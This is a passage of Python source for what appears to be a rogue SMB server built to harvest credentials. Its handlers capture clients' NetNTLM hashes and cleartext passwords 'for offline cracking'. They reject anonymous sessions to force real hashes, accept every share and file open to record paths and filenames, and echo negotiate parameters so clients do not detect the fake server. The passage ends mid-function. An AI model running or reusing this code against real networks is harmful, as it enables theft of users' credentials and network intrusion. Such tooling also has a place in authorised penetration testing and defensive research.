        self.logger.debug("SMB2_LOGOFF", is_client=True)

        response = smb2.SMB2Logoff_Response()
        self.authenticated = False
        self.send_smb2_command(
            response.getData(),
            packet,
            status=nt_errors.STATUS_SUCCESS,
        )

    # -- SMB1 Session --

    def handle_smb1_session_setup(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 SESSION_SETUP_ANDX -- [MS-SMB] §3.3.5.3.

        Dispatches to extended security (WordCount=12, NTLMSSP/SPNEGO via
        :meth:`handle_ntlmssp`) or basic security (WordCount=13, raw
        challenge/response via :meth:`handle_smb1_session_setup_basic`).

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :raises BaseProtoHandler.TerminateConnection: If the WordCount is
            neither 12 nor 13
        """
        command = smb.SMBCommand(packet["Data"][0])
        # [MS-SMB] §2.2.4.6.1: WordCount == 0x0C for extended security
        if command["WordCount"] == 12:
            parameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            data = smb.SMBSessionSetupAndX_Extended_Response_Data(flags=packet["Flags2"])

            setup_params = smb.SMBSessionSetupAndX_Extended_Parameters(
                command["Parameters"]
            )
            setup_data = smb.SMBSessionSetupAndX_Extended_Data()
            setup_data["SecurityBlobLength"] = setup_params["SecurityBlobLength"]
            setup_data.fromString(command["Data"])

            # Extract client OS and LAN Manager identification strings.
            # impacket's AsciiOrUnicodeStructure has a UTF-16BE bug, so
            # we manually parse from raw bytes after the SecurityBlob.
            try:
                is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
                blob_len: int = setup_params["SecurityBlobLength"]
                raw_after_blob = command["Data"][blob_len:]
                # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned
                # from the start of the SMB header. Fixed overhead for
                # WordCount=12: 32(hdr)+1(WC)+24(params)+2(BC) = 59 (odd).
                # Padding needed when (59 + blob_len) is odd → blob_len even.
                # Cannot check byte value: NT 4.0 uses non-zero pad bytes.
                needs_pad = is_unicode and blob_len % 2 == 0
                if needs_pad and len(raw_after_blob) > 0:
                    raw_after_blob = raw_after_blob[1:]
                parts = _split_smb_strings(raw_after_blob, is_unicode)
                client_os = parts[0] if len(parts) > 0 else ""
                client_lanman = parts[1] if len(parts) > 1 else ""
                if client_os:
                    self.client_info["smb_os"] = client_os
                if client_lanman:
                    self.client_info["smb_lanman"] = client_lanman
                self.logger.debug(
                    f"SMB_COM_SESSION_SETUP_ANDX extended: "
                    f"NativeOS={client_os or '(empty)'} "
                    f"NativeLanMan={client_lanman or '(empty)'}",
                    is_client=True,
                )
            except Exception:
                self.logger.debug(
                    "Failed to extract SMB1 session setup client info",
                    is_client=True,
                )

            resp_token, error_code = self.handle_ntlmssp(
                setup_data["SecurityBlob"],
                command_name="SMB_COM_SESSION_SETUP_ANDX",
            )
            data["SecurityBlob"] = resp_token
            data["SecurityBlobLength"] = len(resp_token)
            parameters["SecurityBlobLength"] = len(resp_token)
            data["NativeOS"] = smbserver.encodeSMBString(
                packet["Flags2"],
                self.smb_config.smb_server_os,
            )
            data["NativeLanMan"] = smbserver.encodeSMBString(
                packet["Flags2"],
                self.smb_config.smb_native_lanman,
            )
            self.send_smb1_command(
                smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
                data,
                parameters,
                packet,
                error_code=error_code,
            )
        elif command["WordCount"] == 13:
            # Non-extended security — [MS-CIFS] §2.2.4.53.1
            self.handle_smb1_session_setup_basic(packet, command)
        else:
            self.logger.warning(
                "SMB_COM_SESSION_SETUP_ANDX: unsupported WordCount: "
                f"{command['WordCount']}"
            )
            raise BaseProtoHandler.TerminateConnection

    def handle_smb1_session_setup_basic(
        self,
        packet: smb.NewSMBPacket,
        command: smb.SMBCommand,
    ) -> None:
        """Handle SMB1 non-extended SESSION_SETUP_ANDX (WordCount=13).

        This path handles pre-Vista clients and embedded SMB stacks that
        don't support NTLMSSP/SPNEGO. Instead of a 3-message NTLMSSP
        exchange, the client sends raw LM and NT challenge-response hashes
        (or cleartext passwords) directly in the OEMPassword and
        UnicodePassword fields of the session setup request.

        The server sent an 8-byte challenge in the negotiate response;
        the client hashed its password against that challenge. This method
        extracts those raw hashes, classifies them (NetNTLMv1 vs NetNTLMv2
        based on response length), and formats them for offline cracking.

        Also detects unexpected cleartext despite challenge (non-standard
        response lengths per [MS-CIFS] §3.2.4.2.4).

        Spec: [MS-CIFS] §2.2.4.53.1 (request), §2.2.4.53.2 (response),
              §3.2.4.2.4 (plaintext-despite-challenge)

        :param packet: The original SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :param command: The parsed SMB command containing session setup parameters
            and data fields (WordCount=13)
        :type command: smb.SMBCommand
        """
        cfg = self.smb_config
        setup_params = smb.SMBSessionSetupAndX_Parameters(command["Parameters"])

        oem_len: int = setup_params["AnsiPwdLength"]
        uni_len: int = setup_params["UnicodePwdLength"]
        is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
        # [MS-CIFS] §2.2.4.53.1 — manually parse the data section.
        # impacket's AsciiStructure truncates at \x00 (wrong for Unicode)
        # and UnicodeStructure decodes as UTF-16BE (impacket bug).
        raw_data: bytes = command["Data"]
        # Password fields come first at known offsets
        oem_pwd: bytes = raw_data[:oem_len] if oem_len else b""
        uni_pwd: bytes = raw_data[oem_len : oem_len + uni_len] if uni_len else b""

        # Determine transport type FIRST — needed for string parsing.
        if oem_len == 0 and uni_len == 0:
            # Anonymous — no credentials at all
            transport: str | None = None
        elif uni_len == 0 and oem_len <= 1 and oem_pwd in (b"", b"\x00"):
            # NT 4.0 null session: OemPwdLen=1 with value \x00.
            # [MS-NLMP] §3.2.5.1.2: Z(1) LmChallengeResponse = anonymous.
            transport = None
        elif (
            # Only OEM populated with non-standard length (not 0, not 24)
            (uni_len == 0 and oem_len not in (0, 24) and oem_len <= 256)
            # Only Unicode populated with non-standard length
            or (oem_len == 0 and uni_len not in (0, 24) and uni_len <= 512)
        ):
            # Unexpected plaintext despite challenge — [MS-CIFS] §3.2.4.2.4
            self.logger.debug(
                "SMB_COM_SESSION_SETUP_ANDX: plaintext password detected "
                "despite challenge (unusual client behavior)",
                is_client=True,
            )
            transport = NTLM_TRANSPORT_CLEARTEXT
        else:
            transport = NTLM_TRANSPORT_RAW

        # String fields follow passwords: Account, PrimaryDomain, NativeOS, NativeLanMan
        # Each is null-terminated in the encoding indicated by FLAGS2_UNICODE.
        string_data = raw_data[oem_len + uni_len :]
        # [MS-CIFS] §2.2.4.53.1: Unicode strings are 2-byte aligned from
        # the SMB header start. Fixed overhead for WordCount=13:
        # 32(hdr)+1(WC)+26(params)+2(BC) = 61 (odd). Padding needed when
        # (61 + oem_len + uni_len) is odd, i.e., (oem_len + uni_len) even.
        # Cannot check byte value: NT 4.0 uses non-zero pad bytes (0x69).
        needs_pad = is_unicode and (oem_len + uni_len) % 2 == 0
        if needs_pad and len(string_data) > 0:
            string_data = string_data[1:]
        strings = _split_smb_strings(string_data, is_unicode)

        # For anonymous sessions, Account and PrimaryDomain may be absent
        # or encoded as single ASCII null bytes despite FLAGS2_UNICODE
        # (observed on NT 4.0). The positional parser would assign NativeOS
        # to account. Detect anonymous and parse only OS/LanMan fields.
        if transport is None:
            account = ""
            domain = ""
            # Best-effort: first two non-empty strings are NativeOS/NativeLanMan
            client_os = strings[0] if len(strings) > 0 else ""
            client_lanman = strings[1] if len(strings) > 1 else ""
        else:
            account = strings[0] if len(strings) > 0 else ""
            domain = strings[1] if len(strings) > 1 else ""
            client_os = strings[2] if len(strings) > 2 else ""
            client_lanman = strings[3] if len(strings) > 3 else ""

        self.logger.debug(
            f"SMB_COM_SESSION_SETUP_ANDX basic: "
            f"AccountName={account or '(empty)'} "
            f"PrimaryDomain={domain or '(empty)'} "
            f"NativeOS={client_os or '(empty)'} "
            f"NativeLanMan={client_lanman or '(empty)'} "
            f"OemPwdLen={oem_len} UniPwdLen={uni_len}",
            is_client=True,
        )
        if account:
            self.client_info["smb_account"] = account
        if domain:
            self.client_info["smb_domain"] = domain
        if client_os:
            self.client_info["smb_os"] = client_os
        if client_lanman:
            self.client_info["smb_lanman"] = client_lanman

        # Capture credentials
        if transport == NTLM_TRANSPORT_CLEARTEXT:
            # [MS-CIFS] §2.2.4.53.1: cleartext in UnicodePassword (UTF-16LE)
            # when FLAGS2_UNICODE, else in OEMPassword (ASCII)
            if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE and uni_pwd:
                pwd_data = uni_pwd
                # [MS-CIFS] §2.2.4.53.1: UnicodePassword starts at offset
                # 61 + OemPwdLen from the SMB header. When this is odd,
                # clients (smbclient) prepend a 1-byte alignment pad
                # included in UnicodePasswordLen. Strip it for decode.
                if (oem_len % 2 == 0) and len(pwd_data) > 0:
                    pwd_data = pwd_data[1:]
                # Trim to even length for valid UTF-16LE decode
                if len(pwd_data) % 2 == 1:
                    pwd_data = pwd_data[:-1]
                password = pwd_data.decode("utf-16-le", errors="replace").rstrip("\x00")
            elif oem_pwd:
                password = oem_pwd.decode("ascii", errors="replace")
            else:
                password = ""

            if password and account:
                ct_extras: dict[str, typing.Any] = {}
                if client_os:
                    ct_extras["os"] = client_os
                if client_lanman:
                    ct_extras["lanman"] = client_lanman
                NTLM_handle_legacy_raw_auth(
                    user_name=account,
                    domain_name=domain,
                    lm_response=None,
                    nt_response=None,
                    challenge=self.smb1_challenge,
                    client=self.client_address,
                    session=self.config,
                    logger=self.logger,
                    transport=NTLM_TRANSPORT_CLEARTEXT,
                    cleartext_password=password,
                    extras=ct_extras or None,
                )
        elif transport == NTLM_TRANSPORT_RAW:
            extras: dict[str, typing.Any] = {}
            if client_os:
                extras["os"] = client_os
            if client_lanman:
                extras["lanman"] = client_lanman
            NTLM_handle_legacy_raw_auth(
                user_name=account,
                domain_name=domain,
                lm_response=oem_pwd,
                nt_response=uni_pwd,
                challenge=self.smb1_challenge,
                client=self.client_address,
                session=self.config,
                logger=self.logger,
                transport=NTLM_TRANSPORT_RAW,
                extras=extras or None,
            )
        else:
            # Anonymous — reject to force the client to retry with real
            # credentials.  Without this, XP's redirector uses the anonymous
            # session for the share and never sends real hashes.
            self.logger.debug(
                "Anonymous basic-security session, rejecting", is_client=True
            )
            resp_params = smb.SMBSessionSetupAndXResponse_Parameters()
            resp_params["Action"] = 0
            resp_data = smb.SMBSessionSetupAndXResponse_Data(flags=packet["Flags2"])
            resp_data["NativeOS"] = smbserver.encodeSMBString(
                packet["Flags2"], cfg.smb_server_os
            )
            resp_data["NativeLanMan"] = smbserver.encodeSMBString(
                packet["Flags2"], cfg.smb_native_lanman
            )
            resp_data["PrimaryDomain"] = smbserver.encodeSMBString(
                packet["Flags2"], cfg.smb_nb_domain
            )
            self.send_smb1_command(
                smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
                resp_data,
                resp_params,
                packet,
                error_code=nt_errors.STATUS_ACCESS_DENIED,
            )
            return

        # Allocate Uid for this session — [MS-SMB] §3.3.5.3
        if self.smb1_uid == 0:
            self.smb1_uid = secrets.randbelow(0xFFFE) + 1

        # Build response — [MS-CIFS] §2.2.4.53.2 (WordCount=3)
        resp_params = smb.SMBSessionSetupAndXResponse_Parameters()
        resp_data = smb.SMBSessionSetupAndXResponse_Data(flags=packet["Flags2"])
        resp_params["Action"] = 0
        resp_data["NativeOS"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.smb_server_os
        )
        resp_data["NativeLanMan"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.smb_native_lanman
        )
        resp_data["PrimaryDomain"] = smbserver.encodeSMBString(
            packet["Flags2"], cfg.smb_nb_domain
        )

        # Determine error code — multi-cred or final
        error_code = self._resolve_auth_error_code()

        self.send_smb1_command(
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
            resp_data,
            resp_params,
            packet,
            error_code=error_code,
        )

    def handle_smb1_logoff(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 LOGOFF_ANDX -- [MS-CIFS] §2.2.4.54.

        Sends a proper LOGOFF response (AndX parameters only, no data)
        and terminates the connection.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        self.logger.debug("SMB_COM_LOGOFF_ANDX", is_client=True)

        # SMBLogOffAndX packs the AndX response: 0xFF,0x00,0x0000
        parameters = smb.SMBLogOffAndX()
        self.send_smb1_command(
            smb.SMB.SMB_COM_LOGOFF_ANDX,
            b"",
            parameters,
            packet,
        )
        raise BaseProtoHandler.TerminateConnection

    # ══ Phase 3: Tree Connect ═══════════════════════════════════════════════════

    # -- SMB2 Tree --

    def _extract_smb2_tree_path(self, packet: smb2.SMB2Packet) -> str:
        r"""Extract the UNC path from an SMB2 TREE_CONNECT request.

        Uses the raw ``PathOffset``/``PathLength`` fields from the wire
        rather than impacket's ``Buffer`` field (which has alignment issues).

        :param packet: Parsed SMB2 packet
        :type packet: smb2.SMB2Packet
        :return: Decoded UNC path (e.g. ``\\\\10.0.0.50\\share``)
        :rtype: str
        """
        req = smb2.SMB2TreeConnect(data=packet["Data"])
        raw_data: bytes = packet["Data"]
        path_offset: int = req.fields["PathOffset"] - 64
        path_length: int = req.fields["PathLength"]
        if path_length > 0 and 0 <= path_offset < len(raw_data):
            end = min(path_offset + path_length, len(raw_data))
            return (
                raw_data[path_offset:end]
                .decode("utf-16-le", errors="replace")
                .rstrip("\x00")
            )
        return ""

    def _send_smb2_tree_connect_response(
        self, packet: smb2.SMB2Packet, resp: typing.Any, tree_id: int
    ) -> None:
        """Send an SMB2 TREE_CONNECT response with a server-assigned TreeID.

        Uses manual SMB2Packet construction rather than :meth:`send_smb2_command`
        because the TreeID in the response must be the server-assigned value,
        not the echoed value from the request.

        :param packet: The original TREE_CONNECT request
        :type packet: smb2.SMB2Packet
        :param resp: The populated SMB2TreeConnect_Response structure
        :type resp: typing.Any
        :param tree_id: Server-assigned TreeID for this tree connect
        :type tree_id: int
        """
        smb2_resp = smb2.SMB2Packet()
        smb2_resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
        smb2_resp["Status"] = nt_errors.STATUS_SUCCESS
        smb2_resp["Command"] = packet["Command"]
        smb2_resp["CreditCharge"] = packet["CreditCharge"]
        smb2_resp["Reserved"] = packet["Reserved"]
        smb2_resp["SessionID"] = self.smb2_session_id
        smb2_resp["MessageID"] = packet["MessageID"]
        smb2_resp["TreeID"] = tree_id
        smb2_resp["CreditRequestResponse"] = 32
        smb2_resp["Data"] = resp.getData()
        self.send_data(smb2_resp.getData())

    def handle_smb2_tree_connect(self, packet: smb2.SMB2Packet) -> None:
        r"""SMB2 TREE_CONNECT handler -- [MS-SMB2] §3.3.5.7.

        Accepts all tree connects to simulate a real SMB file server:

        - **IPC$**: accepted as ``SMB2_SHARE_TYPE_PIPE`` so the client
          can issue DFS referral / srvsvc queries before connecting to
          the real share.
        - **Non-IPC$**: accepted as ``SMB2_SHARE_TYPE_DISK`` so the
          client proceeds to CREATE / READ / CLOSE, allowing filename
          capture.  The share path (e.g. ``\\\\10.0.0.50\\share``) is
          recorded in :attr:`client_info`.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        path = ""
        try:
            path = self._extract_smb2_tree_path(packet)
            self.logger.debug(
                f"SMB2_TREE_CONNECT: Path={path or '(empty)'}",
                is_client=True,
            )
        except Exception:
            self.logger.debug(
                "SMB2_TREE_CONNECT (malformed)",
                is_client=True,
                exc_info=True,
            )

        # Extract share name from UNC path (\\server\share → share)
        share_name = path.rsplit("\\", 1)[-1].upper() if path else ""

        self.smb2_tree_id_counter += 1
        resp = smb2.SMB2TreeConnect_Response()
        resp["Capabilities"] = 0
        resp["MaximalAccess"] = 0x001F01FF  # FILE_ALL_ACCESS

        if share_name == "IPC$":
            resp["ShareType"] = 0x02  # SMB2_SHARE_TYPE_PIPE
            resp["ShareFlags"] = 0x00000030  # NO_CACHING
            self.logger.debug(
                "SMB2_TREE_CONNECT IPC$ accepted (TreeId=%d)",
                self.smb2_tree_id_counter,
                is_server=True,
            )
        else:
            # Non-IPC$ disk share — capture the path for intelligence
            if path:
                self.client_info["smb_path"] = path
            resp["ShareType"] = 0x01  # SMB2_SHARE_TYPE_DISK
            # [MS-SMB2] §2.2.10: 0 = default caching (matches real Windows)
            resp["ShareFlags"] = 0x00000000
            self.logger.debug(
                "SMB2_TREE_CONNECT share accepted (TreeId=%d, path=%s)",
                self.smb2_tree_id_counter,
                path,
                is_server=True,
            )

        self._send_smb2_tree_connect_response(packet, resp, self.smb2_tree_id_counter)

    def handle_smb2_tree_disconnect(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 TREE_DISCONNECT handler -- [MS-SMB2] §3.3.5.8.

        Acknowledges tree disconnect requests.  Per [MS-SMB2] §2.2.12,
        the response is a 4-byte structure with only StructureSize and
        Reserved.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        self.logger.debug(
            "SMB2_TREE_DISCONNECT TreeId=%d", packet["TreeID"], is_client=True
        )
        resp = smb2.SMB2TreeDisconnect_Response()
        self.send_smb2_command(resp.getData(), packet)

    # -- SMB2 IOCTL --

    def handle_smb2_ioctl(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 IOCTL handler -- [MS-SMB2] §3.3.5.15.

        Handles two critical IOCTL codes:

        - **FSCTL_VALIDATE_NEGOTIATE_INFO** (0x00140204): SMB 3.0+ clients
          send this after IPC$ tree connect to verify negotiate parameters
          haven't been tampered with.  Per §3.3.5.15.12, the server MUST
          respond with its Capabilities, Guid, SecurityMode, and Dialect.

        - **FSCTL_DFS_GET_REFERRALS** (0x00060194): Per §3.3.5.15.2,
          non-DFS servers MUST return ``STATUS_FS_DRIVER_REQUIRED``.

        All other codes return ``STATUS_FS_DRIVER_REQUIRED``.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        ctl_code = 0
        try:
            req = smb2.SMB2Ioctl(packet["Data"])
            ctl_code = req["CtlCode"]
            self.logger.debug("SMB2_IOCTL CtlCode=0x%08x", ctl_code, is_client=True)
        except Exception:
            self.logger.debug("SMB2_IOCTL (malformed)", is_client=True)
            self._smb2_error_response(packet, nt_errors.STATUS_INVALID_PARAMETER)
            return

        if ctl_code == smb2.FSCTL_VALIDATE_NEGOTIATE_INFO:
            # [MS-SMB2] §3.3.5.15.12: echo back server negotiate params
            self._handle_validate_negotiate(packet, req)
        else:
            # [MS-SMB2] §3.3.5.15.2: non-DFS → STATUS_FS_DRIVER_REQUIRED
            self._smb2_error_response(packet, nt_errors.STATUS_FS_DRIVER_REQUIRED)

    def _handle_validate_negotiate(
        self, packet: smb2.SMB2Packet, req: smb2.SMB2Ioctl
    ) -> None:
        """Handle FSCTL_VALIDATE_NEGOTIATE_INFO -- [MS-SMB2] §3.3.5.15.12.

        The client sends its view of the negotiated parameters. The server
        responds with its own values so the client can verify they match.
        If they don't, the client drops the connection (anti-downgrade).

        :param packet: Parsed SMB2 packet
        :type packet: smb2.SMB2Packet
        :param req: Parsed IOCTL request
        :type req: smb2.SMB2Ioctl
        """
        try:
            vni = smb2.VALIDATE_NEGOTIATE_INFO(req["Buffer"])
            self.logger.debug(
                "FSCTL_VALIDATE_NEGOTIATE_INFO: Capabilities=0x%08x SecurityMode=0x%04x",
                vni["Capabilities"],
                vni["SecurityMode"],
                is_client=True,
            )

            # Build response echoing our negotiate values.
            # These MUST match what we sent in SMB2_NEGOTIATE_RESPONSE.
            server: SMBServer = self.server  # type: ignore[assignment]
            vnir = smb2.VALIDATE_NEGOTIATE_INFO_RESPONSE()
            vnir["Capabilities"] = SMB2_SERVER_CAPABILITIES
            vnir["Guid"] = server.server_guid
            vnir["SecurityMode"] = 0x01  # signing enabled, not required
            vnir["Dialect"] = self.smb2_selected_dialect

            # Build IOCTL response with output data
            resp = smb2.SMB2Ioctl_Response()
            resp["CtlCode"] = smb2.FSCTL_VALIDATE_NEGOTIATE_INFO
            resp["FileID"] = req["FileID"]
            output_data = vnir.getData()
            resp["OutputOffset"] = 64 + 48  # header(64) + fixed response(48)
            resp["OutputCount"] = len(output_data)
            resp["InputOffset"] = 0
            resp["InputCount"] = 0
            resp["Buffer"] = output_data

            self.logger.debug(
                "FSCTL_VALIDATE_NEGOTIATE_INFO: Dialect=0x%04x",
                self.smb2_selected_dialect,
                is_server=True,
            )
            self.send_smb2_command(resp.getData(), packet)

        except Exception:
            self.logger.debug("FSCTL_VALIDATE_NEGOTIATE_INFO failed", exc_info=True)
            self._smb2_error_response(packet, nt_errors.STATUS_ACCESS_DENIED)

    # -- SMB1 Tree --

    def handle_smb1_tree_connect(self, packet: smb.NewSMBPacket) -> None:
        r"""SMB1 TREE_CONNECT_ANDX handler -- [MS-CIFS] §2.2.4.55.

        Accepts all tree connects to simulate a real SMB file server:

        - **IPC$**: accepted so the client can proceed to the real share.
        - **Non-IPC$**: accepted so the client proceeds to NT_CREATE /
          READ, allowing filename capture.  The share path is recorded
          in :attr:`client_info`.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        try:
            # [MS-CIFS] §2.2.4.55.1: SMB_COM_TREE_CONNECT_ANDX Request
            # Use impacket for Parameters parsing (PasswordLength), but
            # extract the Path manually because impacket's
            # SMBTreeConnectAndX_Data has no alignment-pad field between
            # Password and Path — when PasswordLength causes an odd SMB
            # offset, the client inserts a pad byte that impacket's 'u'
            # format parser includes in the Path, producing garbled
            # UTF-16LE.  This only happens with even PasswordLength
            # values (0, 2, 24), but PasswordLength=1 (the common case)
            # is immune because 43+1=44 is already even-aligned.
            cmd = smb.SMBCommand(packet["Data"][0])
            params = smb.SMBTreeConnectAndX_Parameters(cmd["Parameters"])
            pwd_len: int = params["PasswordLength"]
            raw_data: bytes = cmd["Data"]
            is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)

            # Skip Password bytes, then compute alignment pad.
            # [MS-CIFS] §2.2.4.55.1: Unicode Path must be 2-byte aligned
            # from the SMB header start.  Fixed overhead before Data:
            # 32(hdr) + 1(WordCount) + 8(Parameters) + 2(ByteCount) = 43.
            # Pad exists when (43 + PasswordLength) is odd.
            offset = pwd_len
            if is_unicode and (43 + pwd_len) % 2 == 1:
                offset += 1  # skip alignment pad byte

            if is_unicode:
                # Find UTF-16LE null terminator (\x00\x00 at even boundary)
                end = offset
                while end + 1 < len(raw_data):
                    if (
                        raw_data[end] == 0
                        and raw_data[end + 1] == 0
                        and (end - offset) % 2 == 0
                    ):
                        break
                    end += 1
                path = raw_data[offset:end].decode("utf-16-le", errors="replace")
            else:
                # ASCII null-terminated path
                end = raw_data.find(b"\x00", offset)
                if end < 0:
                    end = len(raw_data)
                path = raw_data[offset:end].decode("ascii", errors="replace")

            path = path.rstrip().rstrip("\x00")
            self.logger.debug(
                f"SMB_COM_TREE_CONNECT_ANDX: Path={path or '(empty)'}",
                is_client=True,
            )
            if path:
                self.client_info["smb_path"] = path
        except Exception:
            self.logger.debug(
                "SMB_COM_TREE_CONNECT_ANDX (malformed)",
                is_client=True,
                exc_info=True,
            )

        # Extract share name from path for IPC$ detection
        share_name = path.rsplit("\\", 1)[-1].upper() if path else ""

        resp_params = smb.SMBTreeConnectAndXResponse_Parameters()
        resp_params["OptionalSupport"] = 0x0001
        resp_data = smb.SMBTreeConnectAndXResponse_Data(flags=packet["Flags2"])

        if share_name == "IPC$":
            # Accept IPC$ so the client can proceed to the real share
            self.logger.debug("SMB1 TREE_CONNECT IPC$ accepted", is_server=True)
            resp_data["Service"] = b"IPC\x00"
            resp_data["NativeFileSystem"] = smbserver.encodeSMBString(
                packet["Flags2"], ""
            )
            self.send_smb1_command(
                smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
                resp_data,
                resp_params,
                packet,
            )
        else:
            # Non-IPC$ disk share — accept so client proceeds to
            # NT_CREATE / READ, allowing filename capture.
            self.logger.debug(
                "SMB1 TREE_CONNECT share accepted (path=%s)", path, is_server=True
            )
            resp_data["Service"] = b"A:\x00"
            resp_data["NativeFileSystem"] = smbserver.encodeSMBString(
                packet["Flags2"], ""
            )
            self.send_smb1_command(
                smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
                resp_data,
                resp_params,
                packet,
            )

    def handle_smb1_tree_disconnect(self, packet: smb.NewSMBPacket) -> None:
        """SMB1 TREE_DISCONNECT handler -- [MS-CIFS] §3.3.5.29.

        Acknowledges tree disconnect requests.  ``SMB_COM_TREE_DISCONNECT``
        is NOT an AndX command — the response has zero parameter words
        and zero data bytes.

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        """
        self.logger.debug("SMB_COM_TREE_DISCONNECT Tid=%d", packet["Tid"], is_client=True)
        self.send_smb1_command(
            smb.SMB.SMB_COM_TREE_DISCONNECT,
            b"",
            b"",
            packet,
        )

    # ══ Phase 4: File Operations ══════════════════════════════════════════════════

    # -- SMB2 File Operations --

    def handle_smb2_create(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 CREATE handler -- [MS-SMB2] §3.3.5.9.

        Returns a fake FileId with ``STATUS_SUCCESS`` so the client
        proceeds to READ / QUERY_DIRECTORY, allowing filename capture.
        The ``CreateAction`` is ``FILE_OPENED`` (1) and timestamps are
        set to the current server time.  Empty names (directory opens)
        get ``FILE_ATTRIBUTE_DIRECTORY``; all others get
        ``FILE_ATTRIBUTE_NORMAL``.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        name = ""
        try:
            req = smb2.SMB2Create(packet["Data"])
            name_offset = req["NameOffset"] - 64
            name_length = req["NameLength"]
            raw = packet["Data"]
            if name_length > 0 and 0 <= name_offset < len(raw):
                name = raw[name_offset : name_offset + name_length].decode(
                    "utf-16-le", errors="replace"
                )
            self.logger.debug("SMB2_CREATE Name=%s", name or "(empty)", is_client=True)
            if name:
                self.client_files.add(name)
        except Exception:
            self.logger.debug("SMB2_CREATE (malformed)", is_client=True)

        # Allocate a sequential volatile FileId
        self.smb2_file_id_counter += 1
        now = get_server_time()
        is_dir = name == ""

        resp = smb2.SMB2Create_Response()
        resp["OplockLevel"] = 0  # SMB2_OPLOCK_LEVEL_NONE
        resp["Flags"] = 0
        resp["CreateAction"] = smb2.FILE_OPENED  # 0x01
        resp["CreationTime"] = now
        resp["LastAccessTime"] = now
        resp["LastWriteTime"] = now
        resp["ChangeTime"] = now
        resp["AllocationSize"] = 0
        resp["EndOfFile"] = 0
        # [MS-FSCC] §2.6: DIRECTORY (0x10) or ARCHIVE (0x20) per real Windows
        resp["FileAttributes"] = (
            smb2.FILE_ATTRIBUTE_DIRECTORY if is_dir else smb2.FILE_ATTRIBUTE_ARCHIVE
        )
        resp["Reserved2"] = 0

        file_id = smb2.SMB2_FILEID()
        file_id["Persistent"] = 0xFFFFFFFFFFFFFFFF
        file_id["Volatile"] = self.smb2_file_id_counter
        resp["FileID"] = file_id

        resp["CreateContextsOffset"] = 0
        resp["CreateContextsLength"] = 0
        resp["Buffer"] = b"\x00"

        self.logger.debug(
            "SMB2_CREATE FileId=0x%x IsDir=%s",
            self.smb2_file_id_counter,
            is_dir,
            is_server=True,
        )
        self.send_smb2_command(resp.getData(), packet)

    def handle_smb2_query_directory(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 QUERY_DIRECTORY handler -- [MS-SMB2] §3.3.5.18.

        Returns ``STATUS_NO_MORE_FILES`` for all directory queries.
        The fake directories are empty, so enumeration returns no
        entries immediately.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        try:
            req = smb2.SMB2QueryDirectory(packet["Data"])
            name_offset = req["FileNameOffset"] - 64
            name_length = req["FileNameLength"]
            raw = packet["Data"]
            pattern = "*"
            if name_length > 0 and 0 <= name_offset < len(raw):
                end = min(name_offset + name_length, len(raw))
                pattern = raw[name_offset:end].decode("utf-16-le", errors="replace")
            self.logger.debug("SMB2_QUERY_DIRECTORY Pattern=%s", pattern, is_client=True)
        except Exception:
            self.logger.debug("SMB2_QUERY_DIRECTORY (malformed)", is_client=True)
        self._smb2_error_response(packet, nt_errors.STATUS_NO_MORE_FILES)

    def handle_smb2_query_info(self, packet: smb2.SMB2Packet) -> None:
        """SMB2 QUERY_INFO handler -- [MS-SMB2] §3.3.5.20.

        Returns fake file metadata so clients proceed normally after
        CREATE.  Only ``InfoType=FILE`` (0x01) is handled; all other
        info types return ``STATUS_NOT_SUPPORTED``.

        Observed in pcap: clients send two FileInfoClass values:

        - **FileNetworkOpenInfo** (34): timestamps + size + attributes.
          Sent by Win7, Win8.1, Srv2008, Srv2008R2, Srv2012R2.
        - **FileStandardInfo** (5): size + link count + directory flag.
          Sent by Srv2008.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        info_type = 0
        file_info_class = 0
        try:
            req = smb2.SMB2QueryInfo(packet["Data"])
            info_type = req["InfoType"]
            file_info_class = req["FileInfoClass"]
            self.logger.debug(
                "SMB2_QUERY_INFO InfoType=0x%02x FileInfoClass=%d",
                info_type,
                file_info_class,
                is_client=True,
            )
        except Exception:
            self.logger.debug("SMB2_QUERY_INFO (malformed)", is_client=True)
            self._smb2_error_response(packet, nt_errors.STATUS_INVALID_PARAMETER)
            return

        # InfoType=0x02 (FILESYSTEM): return minimal FileFsDeviceInformation
        # so clients proceed normally.  Security (0x03) and Quota (0x04)
        # are not needed for a capture server.
        if info_type == 0x02:
            # [MS-FSCC] §2.5.10: FileFsDeviceInformation (8 bytes)
            # DeviceType(4) = FILE_DEVICE_DISK (0x07) + Characteristics(4) = 0
            fs_data = (7).to_bytes(4, "little") + b"\x00\x00\x00\x00"
            resp = smb2.SMB2QueryInfo_Response()
            resp["OutputBufferOffset"] = 0x48
